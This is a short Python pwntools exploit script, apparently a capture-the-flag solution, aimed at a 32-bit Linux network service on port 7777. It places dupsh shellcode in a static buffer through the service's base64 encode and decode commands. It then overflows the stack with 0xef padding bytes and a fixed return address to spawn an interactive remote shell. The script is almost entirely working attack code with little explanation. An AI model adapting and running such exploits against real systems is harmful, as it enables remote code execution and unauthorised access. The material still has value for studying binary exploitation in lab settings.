#!/usr/bin/env python
from pwn import *
context(os='linux', arch='i386')

# If a HOST is given on the cmdline, then assume that it is already running there
if 'HOST' in pwn.args:
    HOST = pwn.args['HOST']
    PORT = int(pwn.args.get('PORT', 7777))
else:
    # Otherwise start the binary locally
    HOST = 'localhost'
    PORT = 7777
    process('./5b7420a5bcdc1da85bccc62dcea4c7b8')
    sleep(0.1)

r = remote('localhost', 7777, timeout=0.5)
r.clean(1)

# File Descriptors:
# 0,1,2: Std In/Out/Err
# 3: Listenfd
# 4: Clientfd
shellcode = asm(shellcraft.dupsh(4))

### Send shellcode to get base64 back
log.info("Sending shellcode")
r.sendline('base64 encode')
r.clean(1)
r.sendline(shellcode)
encoded_shellcode = r.recvrepeat().strip()
r.sendline('')

### Move shellcode buffer to predictable location
log.info("Retrieving shellcode to copy it into static buffer")
r.sendline('base64 decode')
r.clean(1)
r.sendline(encoded_shellcode)
shellcode_back = r.recv(len(shellcode)).strip()
assert shellcode == shellcode_back
r.sendline('')

### Overflow
overflow = 'A'*(0xef)     # bytes required to hit return address
overflow += p32(0x0804F0E0) # decode buffer

log.info("Sending overflow:\n%s" % hexdump(overflow))
r.sendline('write ' + overflow)
r.clean(1)

log.info("Shell spawned...")
r.interactive()
